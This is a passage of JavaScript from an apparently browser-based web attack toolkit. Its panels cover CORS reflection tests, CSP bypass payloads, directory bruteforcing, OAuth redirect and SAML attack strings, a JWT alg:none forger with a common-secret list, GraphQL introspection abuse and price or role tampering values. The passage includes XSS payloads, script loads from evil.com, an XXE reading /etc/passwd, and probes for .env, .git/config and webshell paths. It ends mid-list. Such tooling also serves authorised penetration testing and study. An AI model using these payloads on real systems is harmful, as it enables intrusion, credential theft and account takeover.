    { origin: "https://evil.com?target.com", desc: "Query string bypass" },
    { origin: "https://target.com@evil.com", desc: "Userinfo bypass" },
    { origin: "https://evil.com:443", desc: "Port included" },
    { origin: "https://evil.com:80", desc: "Non-standard port" }
  ];

  async function testCorsDeep() {
    const url = $("corsDeepUrl")?.value?.trim();
    if (!url) { toast("Enter a target URL", "error"); return; }

    const resultsEl = $("corsDeepResults");
    resultsEl.innerHTML = '<p class="loading-text">Testing CORS configuration...</p>';

    const results = [];
    for (const { origin, desc } of CORS_ORIGINS) {
      try {
        const resp = await fetchT(url, {
          method: "GET",
          headers: { "Origin": origin, "Access-Control-Request-Method": "GET" }
        });

        const acao = resp.headers?.get?.("access-control-allow-origin") || "";
        const acac = resp.headers?.get?.("access-control-allow-credentials") || "";
        const vary = resp.headers?.get?.("vary") || "";

        const reflected = acao === origin || acao === "*";
        const credentialed = acac.toLowerCase() === "true";
        const wildcard = acao === "*";
        const nullAllowed = origin === "null" && acao === "null";

        let risk = "low";
        let note = "Not reflected";
        if (reflected && credentialed) { risk = "critical"; note = "Origin reflected with credentials!"; }
        else if (reflected && !wildcard) { risk = "high"; note = "Origin reflected (no credentials)"; }
        else if (wildcard && credentialed) { risk = "high"; note = "Wildcard with credentials (browser blocks)"; }
        else if (wildcard) { risk = "medium"; note = "Wildcard ACAO"; }
        else if (nullAllowed) { risk = "high"; note = "Null origin allowed"; }

        results.push({ origin, desc, acao, acac, vary, risk, note, reflected, credentialed });
      } catch (e) {
        results.push({ origin, desc, acao: "error", acac: "", vary: "", risk: "info", note: e.message, reflected: false, credentialed: false });
      }
    }

    resultsEl.innerHTML = `
      <h4>CORS Test Results</h4>
      <div class="corsdeep-result-list">
        ${results.map(r => `
          <div class="corsdeep-result ${r.risk}">
            <div class="corsdeep-result-header">
              <span class="corsdeep-origin">${esc(r.origin)}</span>
              <span class="corsdeep-risk badge ${r.risk}">${r.risk.toUpperCase()}</span>
            </div>
            <div class="corsdeep-desc">${esc(r.desc)}</div>
            <div class="corsdeep-detail">
              <span>ACAO: <code>${esc(r.acao)}</code></span>
              <span>ACAC: <code>${esc(r.acac)}</code></span>
              <span>Vary: <code>${esc(r.vary)}</code></span>
            </div>
            <div class="corsdeep-note">${esc(r.note)}</div>
          </div>
        `).join("")}
      </div>
    `;
  }

  /* ============================================================
     P1-5: CSP BYPASS TECHNIQUES
     ============================================================ */
  function cspBypassPanelHTML() {
    return buildPanel("cspbypass", `
      <div class="cspbypass-section">
        <h3><i class="fas fa-ban"></i> CSP Bypass Techniques</h3>
        <p class="tool-desc">Content Security Policy bypass techniques and payload generator</p>
        <div class="cspbypass-form">
          <label>Target URL:</label>
          <input type="text" id="cspBypassUrl" placeholder="https://target.com" style="width:100%;" />
          <div style="margin-top:12px;">
            <button id="cspBypassStart" class="btn btn-primary"><i class="fas fa-play"></i><span>Analyze CSP</span></button>
          </div>
        </div>
        <div id="cspBypassResults" class="cspbypass-results" style="margin-top:16px;"></div>
      </div>
    `);
  }

  const CSP_BYPASS_TECHNIQUES = [
    { name: "Open Redirect + CSP", desc: "If redirect endpoint is whitelisted, chain with XSS", payload: "https://whitelisted.com/redirect?url=javascript:alert(1)" },
    { name: "Base URI Bypass", desc: "If base-uri is not restricted", payload: "<base href=\"https://evil.com/\"> <script src=\"//evil.com/evil.js\"></script>" },
    { name: "JSONP Endpoint", desc: "Find whitelisted JSONP endpoints", payload: "https://whitelisted.com/jsonp?callback=alert(1)//" },
    { name: "AngularJS Template Injection", desc: "If angular is whitelisted", payload: "{{constructor.constructor('alert(1)')()}}" },
    { name: "Markdown XSS", desc: "If markdown renderer is whitelisted", payload: "[click me](javascript:alert(1))" },
    { name: "eval() in Event Handler", desc: "If event handlers not blocked", payload: "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">" },
    { name: "SVG Event Handler", desc: "If svg is whitelisted", payload: "<svg><script>alert(1)</script></svg>" },
    { name: "Data URI", desc: "If data: is allowed", payload: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" },
    { name: "Blob URL", desc: "If blob: is allowed", payload: "URL.createObjectURL(new Blob(['<script>alert(1)</script>'],{type:'text/html'}))" },
    { name: "Service Worker", desc: "If sw scope is not restricted", payload: "navigator.serviceWorker.register('/sw.js')" },
    { name: "Window.open Bypass", desc: "If popup target not restricted", payload: "window.open('javascript:alert(1)')" },
    { name: "Import Script", desc: "If CSS imports allowed", payload: "@import url('https://evil.com/evil.css');" },
    { name: "Form Action Bypass", desc: "If form-action not restricted", payload: "<form action=\"javascript:alert(1)\"><input type=submit>" },
    { name: "Object/Embed", desc: "If object/embed not restricted", payload: "<object data=\"javascript:alert(1)\">" },
    { name: "Meta Refresh", desc: "If meta not restricted", payload: "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">" }
  ];

  async function analyzeCsp() {
    const url = $("cspBypassUrl")?.value?.trim();
    if (!url) { toast("Enter a URL", "error"); return; }

    const resultsEl = $("cspBypassResults");
    resultsEl.innerHTML = '<p class="loading-text">Fetching CSP headers...</p>';

    try {
      const resp = await fetchT(url);
      const csp = resp.headers?.get?.("content-security-policy") || "No CSP header found";
      const xxp = resp.headers?.get?.("x-content-security-policy") || "";
      const wkxxp = resp.headers?.get?.("x-webkit-csp") || "";

      const allCsp = csp !== "No CSP header found" ? csp : (xxp || wkxxp || "None");

      let analysis = "";
      if (allCsp === "None") {
        analysis = '<div class="csp-missing">No CSP header detected. Site is vulnerable to XSS.</div>';
      } else {
        const directives = allCsp.split(";").map(d => d.trim());
        const findings = [];

        directives.forEach(d => {
          const [dir, ...values] = d.split(/\s+/);
          const val = values.join(" ");

          if (dir === "script-src") {
            if (val.includes("'unsafe-inline'")) findings.push({ severity: "critical", msg: "script-src allows unsafe-inline — XSS possible" });
            if (val.includes("'unsafe-eval'")) findings.push({ severity: "critical", msg: "script-src allows unsafe-eval — code execution possible" });
            if (val.includes("*")) findings.push({ severity: "critical", msg: "script-src has wildcard — no restriction" });
            const domains = val.replace(/'unsafe-[^']+'/g, "").replace(/'self'/g, "").trim().split(/\s+/).filter(Boolean);
            if (domains.length > 0) findings.push({ severity: "info", msg: `Whitelisted domains: ${domains.join(", ")}` });
          }

          if (dir === "object-src" && val.includes("'unsafe-inline'")) {
            findings.push({ severity: "high", msg: "object-src allows unsafe-inline" });
          }

          if (dir === "base-uri" && !val.includes("'self'") && !val.includes("'none'")) {
            findings.push({ severity: "high", msg: "base-uri not restricted — base tag injection possible" });
          }

          if (dir === "frame-ancestors" && val.includes("*")) {
            findings.push({ severity: "medium", msg: "frame-ancestors allows all — clickjacking possible" });
          }
        });

        analysis = findings.map(f => `<div class="csp-finding ${f.severity}">${badge(f.severity.toUpperCase(), f.severity)} ${f.msg}</div>`).join("");
      }

      resultsEl.innerHTML = `
        <h4>CSP Analysis</h4>
        <div class="csp-header"><strong>Policy:</strong> <code>${esc(allCsp.slice(0, 500))}</code></div>
        <div class="csp-analysis">${analysis}</div>
        <h4 style="margin-top:16px;">Bypass Techniques</h4>
        <div class="csp-bypass-list">
          ${CSP_BYPASS_TECHNIQUES.map(t => `
            <div class="csp-bypass-item">
              <div class="csp-bypass-name">${esc(t.name)}</div>
              <div class="csp-bypass-desc">${esc(t.desc)}</div>
              <code class="csp-bypass-payload">${esc(t.payload)}</code>
            </div>
          `).join("")}
        </div>
      `;
    } catch (e) {
      resultsEl.innerHTML = `<p class="error">Error: ${esc(e.message)}</p>`;
    }
  }

  /* ============================================================
     P1-6: DIRECTORY BRUTEFORCE IMPROVEMENTS
     ============================================================ */
  function dirBrutePanelHTML() {
    return buildPanel("dirbrute", `
      <div class="dirbrute-section">
        <h3><i class="fas fa-folder-tree"></i> Enhanced Directory Bruteforce</h3>
        <p class="tool-desc">Recursive directory bruteforce with extension fuzzing and response diffing</p>
        <div class="dirbrute-form">
          <label>Target URL:</label>
          <input type="text" id="dirBruteUrl" placeholder="https://target.com/FUZZ" style="width:100%;" />
          <label>Extensions (comma-separated):</label>
          <input type="text" id="dirBruteExts" placeholder=".php,.html,.asp,.jsp,.txt" value=".php,.html,.asp,.jsp,.txt,.bak,.old,.json,.xml" style="width:100%;" />
          <label>Depth:</label>
          <input type="number" id="dirBruteDepth" value="1" min="1" max="3" style="width:80px;" />
          <label>Filter by status:</label>
          <input type="text" id="dirBruteStatusFilter" placeholder="200,301,302,403" value="200,301,302,403" style="width:200px;" />
          <label>Min/Max length:</label>
          <input type="number" id="dirBruteMinLen" placeholder="Min" style="width:80px;" />
          <input type="number" id="dirBruteMaxLen" placeholder="Max" style="width:80px;" />
          <div style="margin-top:12px;">
            <button id="dirBruteStart" class="btn btn-primary"><i class="fas fa-play"></i><span>Start Bruteforce</span></button>
            <button id="dirBruteStop" class="btn btn-danger" style="display:none;"><i class="fas fa-stop"></i><span>Stop</span></button>
            <span id="dirBruteStatus" style="margin-left:12px;color:var(--text-dim);"></span>
          </div>
        </div>
        <div id="dirBruteResults" class="dirbrute-results" style="margin-top:16px;"></div>
      </div>
    `);
  }

  const DIR_COMMON_WORDS = [
    "admin","backup","config","database","db","debug","dev","download",
    "files","ftp","git","hidden","images","include","js","lib","log",
    "login","manage","media","old","private","public","secret","src",
    "staging","static","test","tmp","upload","uploads","user","users",
    "wp-admin","wp-content","wp-includes","wp-json","wp-login.php",
    "api","v1","v2","v3","graphql","swagger","docs","openapi",
    "server-status","server-info","phpinfo","info","status","health",
    ".env",".git",".git/config",".git/HEAD",".htaccess",".htpasswd",
    "robots.txt","sitemap.xml","crossdomain.xml","clientaccesspolicy.xml",
    "favicon.ico","humans.txt","security.txt",".well-known",
    "README","CHANGELOG","LICENSE","TODO","CONTRIBUTING",
    "composer.json","package.json","Gemfile","requirements.txt",
    "Dockerfile","docker-compose.yml","Makefile","Vagrantfile",
    ".DS_Store","Thumbs.db","desktop.ini","web.config",
    "data","temp","cache","log","logs","logs/error.log",
    "phpmyadmin","pma","adminer","mysql","postgres",
    "shell","cmd","exec","terminal","console","webshell"
  ];

  let dirBruteRunning = false;

  async function runDirBrute() {
    const urlTemplate = $("dirBruteUrl")?.value?.trim();
    if (!urlTemplate) { toast("Enter a target URL with FUZZ", "error"); return; }

    const exts = $("dirBruteExts")?.value?.split(",").map(e => e.trim()).filter(Boolean) || [];
    const depth = parseInt($("dirBruteDepth")?.value || "1");
    const statusFilter = $("dirBruteStatusFilter")?.value?.split(",").map(s => parseInt(s.trim())).filter(Boolean) || [];
    const minLen = parseInt($("dirBruteMinLen")?.value) || 0;
    const maxLen = parseInt($("dirBruteMaxLen")?.value) || Infinity;

    dirBruteRunning = true;
    $("dirBruteStart").style.display = "none";
    $("dirBruteStop").style.display = "inline-flex";
    const resultsEl = $("dirBruteResults");
    resultsEl.innerHTML = '<p class="loading-text">Scanning...</p>';

    const words = DIR_COMMON_WORDS;
    const found = [];
    let scanned = 0;
    const total = words.length * (exts.length + 1);

    for (const word of words) {
      if (!dirBruteRunning) break;

      const urls = [urlTemplate.replace("FUZZ", word), ...exts.map(ext => urlTemplate.replace("FUZZ", word + ext))];

      const promises = urls.map(async (url) => {
        try {
          const resp = await fetchT(url);
          const status = resp.status;
          const body = await resp.text().catch(() => "");
          const len = body.length;

          if (statusFilter.length > 0 && !statusFilter.includes(status)) return;
          if (len < minLen || len > maxLen) return;

          const is404 = body.includes("404") && body.includes("not found");
          if (is404 && status === 404) return;

          found.push({ url, status, length: len, word });
        } catch {}
      });

      await Promise.all(promises);
      scanned += urls.length;
      $("dirBruteStatus").textContent = `${scanned}/${total} tested — ${found.length} found`;

      if (found.length > 0) {
        resultsEl.innerHTML = found.map(f => `
          <div class="dirbrute-result">
            <span class="dirbrute-status ${f.status === 200 ? 'status-200' : f.status === 403 ? 'status-403' : ''}">${f.status}</span>
            <span class="dirbrute-url">${esc(f.url)}</span>
            <span class="dirbrute-len">[${f.length}]</span>
          </div>
        `).join("");
      }
    }

    resultsEl.innerHTML = found.length === 0
      ? '<p class="dash-empty">No directories found</p>'
      : found.map(f => `
        <div class="dirbrute-result">
          <span class="dirbrute-status ${f.status === 200 ? 'status-200' : f.status === 403 ? 'status-403' : ''}">${f.status}</span>
          <span class="dirbrute-url">${esc(f.url)}</span>
          <span class="dirbrute-len">[${f.length}]</span>
        </div>
      `).join("");

    toast(`Directory bruteforce complete: ${found.length} found`, "success");
    dirBruteRunning = false;
    $("dirBruteStart").style.display = "inline-flex";
    $("dirBruteStop").style.display = "none";
  }

  /* ============================================================
     P2-7: OAUTH/SAML DEEP TESTING
     ============================================================ */
  function oauthSamlPanelHTML() {
    return buildPanel("oauthsaml", `
      <div class="oauthsaml-section">
        <h3><i class="fas fa-key"></i> OAuth/SAML Deep Testing</h3>
        <p class="tool-desc">Advanced OAuth and SAML security testing helpers</p>
        <div class="oauthsaml-tabs">
          <button class="oauth-tab active" data-tab="oauth-test">OAuth Testing</button>
          <button class="oauth-tab" data-tab="saml-test">SAML Testing</button>
          <button class="oauth-tab" data-tab="token-test">Token Analysis</button>
        </div>
        <div id="oauth-test" class="oauth-tab-content" style="display:block;">
          <h4>OAuth Security Checks</h4>
          <div class="oauth-checks">
            <div class="oauth-check"><input type="checkbox" id="oauthCheckRedirect" checked /> <label>Redirect URI Manipulation</label></div>
            <div class="oauth-check"><input type="checkbox" id="oauthCheckState" checked /> <label>State Parameter Bypass</label></div>
            <div class="oauth-check"><input type="checkbox" id="oauthCheckPKCE" checked /> <label>PKCE Downgrade</label></div>
            <div class="oauth-check"><input type="checkbox" id="oauthCheckTokenLeak" checked /> <label>Token Leakage via Referrer</label></div>
            <div class="oauth-check"><input type="checkbox" id="oauthCheckCSRF" checked /> <label>CSRF on Callback</label></div>
          </div>
          <div class="oauth-payloads">
            <h4>Redirect URI Bypass Payloads</h4>
            <div class="payload-list">
              <code>https://target.com/callback</code>
              <code>https://target.com/callback?evil=attacker.com</code>
              <code>https://target.com/callback#fragment</code>
              <code>https://target.com/callback@evil.com</code>
              <code>https://target.com/callback.evil.com</code>
              <code>https://evil.com/callback</code>
              <code>https://target.com%0d%0aLocation:%20https://evil.com</code>
              <code>https://target.com/callback\\@evil.com</code>
            </div>
            <h4>State Parameter Bypass</h4>
            <div class="payload-list">
              <code>Remove state parameter entirely</code>
              <code>Use predictable state (sequential numbers)</code>
              <code>Reuse old state value</code>
              <code>Set state to empty string</code>
              <code>Set state to null</code>
            </div>
          </div>
        </div>
        <div id="saml-test" class="oauth-tab-content" style="display:none;">
          <h4>SAML Attack Vectors</h4>
          <div class="saml-attacks">
            <div class="saml-attack">
              <h5>Signature Wrapping</h5>
              <p>Insert malicious assertion while preserving valid signature</p>
              <code>&lt;saml:Assertion&gt;...&lt;!-- Original --&gt;...&lt;/saml:Assertion&gt;&lt;saml:Assertion xmlns:saml="..."&gt;&lt;!-- Malicious --&gt;&lt;/saml:Assertion&gt;</code>
            </div>
            <div class="saml-attack">
              <h5>XML Signature Stripping</h5>
              <p>Remove signature element entirely</p>
              <code>Remove &lt;ds:Signature&gt; element and modify assertion</code>
            </div>
            <div class="saml-attack">
              <h5>Comment Injection</h5>
              <p>Inject XML comments to split signature</p>
              <code>&lt;!-- Comment --&gt;&lt;saml:Assertion&gt;...&lt;/saml:Assertion&gt;</code>
            </div>
            <div class="saml-attack">
              <h5>XXE in SAML</h5>
              <p>XML External Entity injection</p>
              <code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;&lt;saml:NameID&gt;&amp;xxe;&lt;/saml:NameID&gt;</code>
            </div>
            <div class="saml-attack">
              <h5>Identifier Enumeration</h5>
              <p>Test different NameID formats</p>
              <code>user@email.com, user, 12345, CN=user, uid=user</code>
            </div>
          </div>
        </div>
        <div id="token-test" class="oauth-tab-content" style="display:none;">
          <h4>JWT/Token Analysis</h4>
          <textarea id="tokenInput" rows="4" placeholder="Paste JWT or access token here..." style="width:100%;"></textarea>
          <button id="tokenAnalyzeBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-search"></i><span>Analyze Token</span></button>
          <div id="tokenAnalysisResult" style="margin-top:12px;"></div>
        </div>
      </div>
    `);
  }

  /* ============================================================
     P2-8: JWT ADVANCED ATTACKS
     ============================================================ */
  function jwtAdvancedPanelHTML() {
    return buildPanel("jwtadvanced", `
      <div class="jwtadvanced-section">
        <h3><i class="fas fa-ticket"></i> JWT Advanced Attacks</h3>
        <p class="tool-desc">Advanced JWT attack techniques: key confusion, JWKS injection, alg:none, and more</p>
        <textarea id="jwtAdvancedInput" rows="4" placeholder="Paste JWT token here..." style="width:100%;"></textarea>
        <div class="jwt-attack-options">
          <h4>Attack Techniques</h4>
          <button class="jwt-attack-btn" data-attack="decode"><i class="fas fa-code"></i> Decode</button>
          <button class="jwt-attack-btn" data-attack="algnone"><i class="fas fa-ban"></i> Alg:none</button>
          <button class="jwt-attack-btn" data-attack="hs256tor256"><i class="fas fa-exchange-alt"></i> HS256→RS256</button>
          <button class="jwt-attack-btn" data-attack="jwkspoison"><i class="fas fa-skull"></i> JWKS Poisoning</button>
          <button class="jwt-attack-btn" data-attack="jku"><i class="fas fa-link"></i> JKU/X5U Attack</button>
          <button class="jwt-attack-btn" data-attack="bruteforce"><i class="fas fa-hammer"></i> Secret Brute-Force</button>
          <button class="jwt-attack-btn" data-attack="nonealg"><i class="fas fa-eraser"></i> Remove Signature</button>
        </div>
        <div id="jwtAdvancedResult" class="jwt-advanced-result" style="margin-top:16px;"></div>
      </div>
    `);
  }

  const JWT_COMMON_SECRETS = [
    "secret", "password", "123456", "admin", "test", "key", "jwt_secret",
    "supersecret", "changeme", "default", "your-256-bit-secret",
    "shhhhh", "keyboard cat", "abc123", "development", "production",
    "staging", "local", "jwt", "token", "auth", "bearer",
    "HS256-secret-key", "my-secret-key", "secret-key",
    "256-bit-secret", "your-secret-key", "s3cr3t"
  ];

  function analyzeJwt() {
    const token = $("jwtAdvancedInput")?.value?.trim();
    if (!token) { toast("Paste a JWT token", "error"); return; }

    const parts = token.split(".");
    if (parts.length !== 3) { toast("Invalid JWT format", "error"); return; }

    try {
      const header = JSON.parse(atob(parts[0].replace(/-/g, "+").replace(/_/g, "/")));
      const payload = JSON.parse(atob(parts[1].replace(/-/g, "+").replace(/_/g, "/")));

      let attackHtml = "";

      // Decode
      attackHtml += `
        <div class="jwt-section">
          <h4>Header</h4>
          <pre>${esc(JSON.stringify(header, null, 2))}</pre>
          <h4>Payload</h4>
          <pre>${esc(JSON.stringify(payload, null, 2))}</pre>
        </div>
      `;

      // Alg:none attack
      if (header.alg !== "none") {
        const forged = btoa(JSON.stringify({ ...header, alg: "none" })).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
        const forgedToken = forged + "." + parts[1] + ".";
        attackHtml += `
          <div class="jwt-section">
            <h4>Alg:none Attack</h4>
            <p>Remove algorithm and signature:</p>
            <code class="jwt-forged">${esc(forgedToken)}</code>
            <button class="btn btn-sm" onclick="navigator.clipboard.writeText(this.previousElementSibling.textContent).then(()=>window.showToast?.('Copied','success'))"><i class="fas fa-copy"></i></button>
          </div>
        `;
      }

      // HS256→RS256 key confusion
      attackHtml += `
        <div class="jwt-section">
          <h4>HS256→RS256 Key Confusion</h4>
          <p>Sign with public key as HMAC secret. If server uses RSA public key for HS256 verification:</p>
          <code>Use the server's RSA PUBLIC KEY as the HMAC secret</code>
        </div>
      `;

      // JWKS poisoning
      attackHtml += `
        <div class="jwt-section">
          <h4>JWKS Poisoning (jwk header param)</h4>
          <p>Add your own public key in the header:</p>
          <code>{"typ":"JWT","alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB","kid":"attacker-key"}}</code>
        </div>
      `;

      // JKU/X5U
      attackHtml += `
        <div class="jwt-section">
          <h4>JKU/X5U Attack</h4>
          <p>Point JKU/X5U to your server:</p>
          <code>{"typ":"JWT","alg":"RS256","jku":"https://evil.com/jwks.json","kid":"stolen-key"}</code>
        </div>
      `;

      // Expired token check
      if (payload.exp && payload.exp < Date.now() / 1000) {
        attackHtml += `<div class="jwt-warning">${badge("WARNING", "warning")} Token is EXPIRED (exp: ${new Date(payload.exp * 1000).toISOString()})</div>`;
      }

      // NBF check
      if (payload.nbf && payload.nbf > Date.now() / 1000) {
        attackHtml += `<div class="jwt-warning">${badge("WARNING", "warning")} Token is NOT YET VALID (nbf: ${new Date(payload.nbf * 1000).toISOString()})</div>`;
      }

      $("jwtAdvancedResult").innerHTML = attackHtml;
    } catch (e) {
      toast(`Error parsing JWT: ${e.message}`, "error");
    }
  }

  /* ============================================================
     P2-9: GRAPHQL INTROSPECTION ABUSE
     ============================================================ */
  function graphqlAbusePanelHTML() {
    return buildPanel("graphqlabuse", `
      <div class="graphqlabuse-section">
        <h3><i class="fas fa-project-diagram"></i> GraphQL Introspection Abuse</h3>
        <p class="tool-desc">Advanced GraphQL testing: introspection, batching, field suggestions, depth attacks</p>
        <div class="graphql-form">
          <label>GraphQL Endpoint:</label>
          <input type="text" id="graphqlEndpoint" placeholder="https://target.com/graphql" style="width:100%;" />
          <label>Authorization Header (optional):</label>
          <input type="text" id="graphqlAuth" placeholder="Bearer token..." style="width:100%;" />
          <div style="margin-top:12px;">
            <button class="graphql-attack-btn btn btn-primary" data-query="introspection"><i class="fas fa-search"></i> Full Introspection</button>
            <button class="graphql-attack-btn btn btn-secondary" data-query="schema"><i class="fas fa-code"></i> Schema Dump</button>
            <button class="graphql-attack-btn btn btn-secondary" data-query="batch"><i class="fas fa-layer-group"></i> Batch Query</button>
            <button class="graphql-attack-btn btn btn-secondary" data-query="depth"><i class="fas fa-sort-amount-down"></i> Depth Attack</button>
            <button class="graphql-attack-btn btn btn-secondary" data-query="suggestion"><i class="fas fa-lightbulb"></i> Field Suggestions</button>
          </div>
        </div>
        <div id="graphqlResults" class="graphql-results" style="margin-top:16px;"></div>
      </div>
    `);
  }

  const GRAPHQL_QUERIES = {
    introspection: `{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind fields { name type { name kind ofType { name kind } } } } } }`,
    types: `{ __schema { types { name kind description fields { name description args { name type { name kind } } } } } }`,
    queryFields: `{ __type(name: "Query") { fields { name description args { name type { name kind } } type { name kind } } } }`,
    mutationFields: `{ __type(name: "Mutation") { fields { name description args { name type { name kind } } type { name kind } } } }`
  };

  async function runGraphQLAttack(queryType) {
    const endpoint = $("graphqlEndpoint")?.value?.trim();
    if (!endpoint) { toast("Enter GraphQL endpoint", "error"); return; }

    const auth = $("graphqlAuth")?.value?.trim();
    const headers = { "Content-Type": "application/json" };
    if (auth) headers["Authorization"] = auth;

    const resultsEl = $("graphqlResults");

    if (queryType === "batch") {
      const batch = Array(10).fill(null).map((_, i) => ({
        id: i,
        query: `{ __typename }`
      }));

      try {
        const resp = await fetchT(endpoint, { method: "POST", headers, body: JSON.stringify(batch) });
        const data = await resp.json();
        resultsEl.innerHTML = `<h4>Batch Query Result (10 requests)</h4><pre>${esc(JSON.stringify(data, null, 2))}</pre>`;
      } catch (e) {
        resultsEl.innerHTML = `<p class="error">Error: ${esc(e.message)}</p>`;
      }
      return;
    }

    if (queryType === "depth") {
      let deepQuery = "{ ";
      for (let i = 0; i < 20; i++) deepQuery += `a${i}: __typename `;
      deepQuery += "}";

      try {
        const resp = await fetchT(endpoint, { method: "POST", headers, body: JSON.stringify({ query: deepQuery }) });
        const data = await resp.json();
        const hasDepthLimit = data.errors?.some(e => e.message?.includes("depth"));
        resultsEl.innerHTML = `
          <h4>Depth Attack Result</h4>
          <p>${hasDepthLimit ? badge("Depth limit detected", "warning") : badge("No depth limit!", "critical")}</p>
          <pre>${esc(JSON.stringify(data, null, 2).slice(0, 2000))}</pre>
        `;
      } catch (e) {
        resultsEl.innerHTML = `<p class="error">Error: ${esc(e.message)}</p>`;
      }
      return;
    }

    if (queryType === "suggestion") {
      const queries = ["user", "users", "admin", "me", "profile", "login", "signup", "search", "items", "posts", "comments", "orders", "products", "categories", "settings", "config", "secret", "internal", "debug", "test"];
      const found = [];

      for (const q of queries) {
        try {
          const resp = await fetchT(endpoint, { method: "POST", headers, body: JSON.stringify({ query: `{ ${q} { __typename } }` }) });
          const data = await resp.json();
          if (data.data && !data.errors?.some(e => e.message?.includes("Cannot query field"))) {
            found.push({ query: q, response: data });
          }
        } catch {}
      }

      resultsEl.innerHTML = `
        <h4>Field Suggestion Results</h4>
        <p>Discovered ${found.length} accessible fields:</p>
        ${found.map(f => `<div class="graphql-field"><code>${esc(f.query)}</code> <span class="badge success">accessible</span></div>`).join("")}
      `;
      return;
    }

    // Default: introspection/schema
    const query = GRAPHQL_QUERIES[queryType] || GRAPHQL_QUERIES.introspection;
    try {
      const resp = await fetchT(endpoint, { method: "POST", headers, body: JSON.stringify({ query }) });
      const data = await resp.json();
      resultsEl.innerHTML = `<h4>${queryType} Result</h4><pre>${esc(JSON.stringify(data, null, 2).slice(0, 5000))}</pre>`;
    } catch (e) {
      resultsEl.innerHTML = `<p class="error">Error: ${esc(e.message)}</p>`;
    }
  }

  /* ============================================================
     P2-10: gRPC/HTTP2 DETECTION
     ============================================================ */
  function grpcPanelHTML() {
    return buildPanel("grpc", `
      <div class="grpc-section">
        <h3><i class="fas fa-exchange-alt"></i> gRPC & HTTP/2 Detection</h3>
        <p class="tool-desc">Detect gRPC services and HTTP/2 support on target endpoints</p>
        <div class="grpc-form">
          <label>Target URL:</label>
          <input type="text" id="grpcTargetUrl" placeholder="https://target.com" style="width:100%;" />
          <div style="margin-top:12px;">
            <button id="grpcScanBtn" class="btn btn-primary"><i class="fas fa-play"></i><span>Detect Services</span></button>
          </div>
        </div>
        <div id="grpcResults" class="grpc-results" style="margin-top:16px;"></div>
      </div>
    `);
  }

  const GRPC_PATHS = [
    "/grpc.health.v1.Health/Check",
    "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
    "/grpc.reflection.v1.ServerReflection/ServerReflectionInfo",
    "/package.ServiceName/MethodName",
    "/grpc.health.v1.Health",
    "/grpc.reflection.v1alpha.ServerReflection"
  ];

  async function scanGrpc() {
    const url = $("grpcTargetUrl")?.value?.trim();
    if (!url) { toast("Enter a target URL", "error"); return; }

    const resultsEl = $("grpcResults");
    resultsEl.innerHTML = '<p class="loading-text">Scanning...</p>';

    const results = [];

    // Test HTTP/2
    try {
      const resp = await fetchT(url);
      const proto = resp.headers?.get?.("alt-svc") || "";
      const via = resp.headers?.get?.("via") || "";
      const h2Supported = proto.includes("h2") || via.includes("2");
      results.push({ test: "HTTP/2 Support", result: h2Supported ? "Detected" : "Not detected", detail: `alt-svc: ${proto || "none"}` });
    } catch (e) {
      results.push({ test: "HTTP/2 Support", result: "Error", detail: e.message });
    }

    // Test gRPC paths
    for (const path of GRPC_PATHS) {
      try {
        const testUrl = new URL(path, url).href;
        const resp = await fetchT(testUrl);
        const ct = resp.headers?.get?.("content-type") || "";
        const grpc = ct.includes("grpc") || resp.status === 200;
        results.push({ test: `gRPC: ${path}`, result: grpc ? "Accessible" : `${resp.status}`, detail: `Content-Type: ${ct || "none"}` });
      } catch (e) {
        results.push({ test: `gRPC: ${path}`, result: "Error", detail: e.message });
      }
    }

    resultsEl.innerHTML = `
      <h4>gRPC/HTTP2 Scan Results</h4>
      ${results.map(r => `
        <div class="grpc-result">
          <span class="grpc-test">${esc(r.test)}</span>
          <span class="grpc-result-status ${r.result === 'Detected' || r.result === 'Accessible' ? 'status-200' : ''}">${esc(r.result)}</span>
          <span class="grpc-detail">${esc(r.detail)}</span>
        </div>
      `).join("")}
    `;
  }

  /* ============================================================
     P2-11: BUSINESS LOGIC HELPERS
     ============================================================ */
  function bizLogicPanelHTML() {
    return buildPanel("bizlogic", `
      <div class="bizlogic-section">
        <h3><i class="fas fa-brain"></i> Business Logic Helpers</h3>
        <p class="tool-desc">Comprehensive business logic testing: price manipulation, privilege escalation, IDOR, race conditions, multi-step bypass, state manipulation, and more</p>
        <div class="bizlogic-grid">
          <div class="bizlogic-card">
            <h4><i class="fas fa-dollar-sign"></i> Price Manipulation</h4>
            <div class="bizlogic-payloads">
              <code>price=0</code>
              <code>price=-1</code>
              <code>price=0.01</code>
              <code>price=99999999</code>
              <code>price=NaN</code>
              <code>price=undefined</code>
              <code>price=null</code>
              <code>price=""</code>
              <code>price=0x0</code>
              <code>price=0.0000001</code>
              <code>price=-0.01</code>
              <code>price=Infinity</code>
              <code>quantity=-1</code>
              <code>quantity=0</code>
              <code>quantity=999999</code>
              <code>quantity=1.5</code>
              <code>quantity=-999</code>
              <code>discount=100</code>
              <code>discount=101</code>
              <code>discount=-1</code>
              <code>discount=0</code>
              <code>discount=99999</code>
              <code>discount=NaN</code>
              <code>coupon=ADMIN</code>
              <code>coupon=TEST</code>
              <code>coupon=FREE</code>
              <code>coupon=NULL</code>
              <code>coupon=""</code>
              <code>coupon=AAAA</code>
              <code>total=0</code>
              <code>total=-1</code>
              <code>total=null</code>
              <code>amount=0</code>
              <code>amount=-1</code>
              <code>subtotal=0</code>
              <code>tax=0</code>
              <code>shipping=0</code>
              <code>vat=0</code>
              <code>surcharge=0</code>
              <code>original_price=0</code>
              <code>unit_price=0</code>
              <code>sale_price=0</code>
              <code>cost=0</code>
              <code>currency=USD</code>
              <code>currency=JPY</code>
              <code>currency=BTC</code>
              <code>currency=ETH</code>
            </div>
          </div>
          <div class="bizlogic-card">
            <h4><i class="fas fa-user-shield"></i> Privilege Escalation</h4>
            <div class="bizlogic-payloads">
              <code>role=admin</code>
              <code>role=superadmin</code>
              <code>role=root</code>
              <code>role=owner</code>
              <code>role=operator</code>
              <code>role=moderator</code>
              <code>role=editor</code>
              <code>admin=true</code>
              <code>admin=1</code>
              <code>admin=yes</code>
              <code>isAdmin=true</code>
